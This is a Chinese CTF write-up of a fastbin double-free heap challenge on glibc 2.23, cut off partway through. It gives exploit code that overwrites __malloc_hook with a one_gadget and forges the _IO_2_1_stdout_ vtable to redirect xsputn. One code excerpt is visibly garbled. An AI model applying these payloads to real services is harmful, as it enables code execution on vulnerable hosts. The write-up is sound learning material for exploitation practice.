2019年12月圣诞前后某日某平台的习题之一，没给libc，一般默认应该是Ubuntu16.04，libc-2.23。
题目限制很多，其中不少新的fastbin double free利用套路，网上相关资料也不多见，值得学习记录一下
## 应用程序情况
程序为ELF64，查看保护情况
    $ checksec heap
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
可看出保护全开，再看程序功能。
    $ ./heap
    1.Add 
    2.Delete 
    3.Show 
    4.Exit 
    Choice :
可看出程序共3个功能，添加，删除和显示
添加功能函数代码为：
    sub_AFA();
      for ( i = 0; i = 0 && v1 chunk4->chunk3->....`, 然后进行fastbin攻击
#### __malloc_hook
fastbin常规攻击`__malloc_hook`， 方法是在`__malloc_hook`上方寻找满足条件的chunk
size，在`__malloc_hook-0x23`位置寻找到满足条件的size，size为0x7f，那chunk的大小为`0x70-0x80`之间即可，我们使用的0x68尺寸对应的chunk大小为0x70，可利用该位置
利用方法为：
    add(0x68,p64(libc.sym['__malloc_hook']-0x23))
    add(0x68,'xxxx')
    add(0x68,'cccc')
    one_gadget=libc.address+0x4526a
    add(0x68,'a'*0x13+p64(one_gadget))
题目给的程序限制了`__malloc_hook`的操作，修改也无法作用
#### `_IO_2_1_stdout_`
在`_IO_2_1_stdout_`结构中找到满足条件的size，位于`_IO_2_1_stdout_+0x9d`就有个位置
    add(0x68,p64(libc.sym['_IO_2_1_stdout_']+0x9d))# index heap 3
    add(0x68,p64(one_gadget)*12) #index heap 4
    add(0x68,'cccc') #heap 5
    add(0x68,'\x00'*3+p64(0)*2+p64(0xffffffff)+p64(one_gadget)*2++p64(libc.sym['_IO_2_1_stdout_']+144)) 
    #add(0x68,'\x00'*3+p64(0)*2+p64(0xffffffff)+p64(one_gadget)*2+p64(heap_addr-0x60)) 
    # 可将vtable指向heap-0x60,即`index heap 4`的内容位置，参数偏移可调试计算
    '''
    这里也可直接使用_IO_2_1_stdout_中的地址（无需泄露heap地址），
    这里0xfffffffff为mode值，一般为0或-1，
    下面2个one_gadget位于_IO_2_1_stdout_+200和_IO_2_1_stdout_+208,
    vtable结构中的xputsn位于vtable的第8个指针，
    那vtable地址可指向_IO_2_1_stdout_+144或_IO_2_1_stdout_+152，
    即可控制xpustsn指向one_gadget
    #note: puts或printf函数会调用xputsn指向的函数
    '''
`_IO_2_1_stdout_`结构体如下：
    gef➤  p _IO_2_1_stdout_
    $5 = _IO_FILE_plus
    _IO_FILE_plus